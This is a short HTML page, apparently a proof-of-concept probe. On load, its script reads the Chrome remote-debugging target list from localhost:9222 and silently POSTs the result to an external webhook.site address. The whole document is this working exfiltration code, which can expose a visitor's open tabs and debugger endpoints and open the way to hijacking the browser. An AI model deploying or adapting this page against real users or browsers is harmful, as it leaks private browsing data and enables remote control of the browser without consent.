<!doctype html>
<html>

<body>
    <pre id="out">Checking DevTools...</pre>
    <script>
        (async () => {
            const out = document.getElementById("out");
            const hook = "https://webhook.site/96a9c841-170a-46a1-aca9-db43dee912a8";

            async function report(message) {
                out.textContent += "\n" + message;
                try {
                    await fetch(hook, {
                        method: "POST",
                        mode: "no-cors",
                        body: message
                    });
                } catch (_) { }
            }

            try {
                const r = await fetch("http://localhost:9222/json/list");
                const data = await r.text();
                await report("Targets HTTP " + r.status + ": " + data);
            } catch (e) {
                await report("Targets failed: " + e);
            }
        })();
    </script>
</body>

</html>
